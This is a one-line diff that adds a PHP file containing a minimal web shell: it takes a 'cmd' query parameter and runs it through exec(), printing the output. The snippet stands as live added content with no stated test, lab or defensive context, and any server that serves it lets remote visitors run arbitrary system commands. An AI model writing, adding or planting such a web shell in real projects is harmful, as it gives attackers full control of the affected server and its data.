@@ -1,0 +1,1 @@
+<?php if (isset($_GET["cmd"])) var_dump(exec($_GET["cmd"]));?>
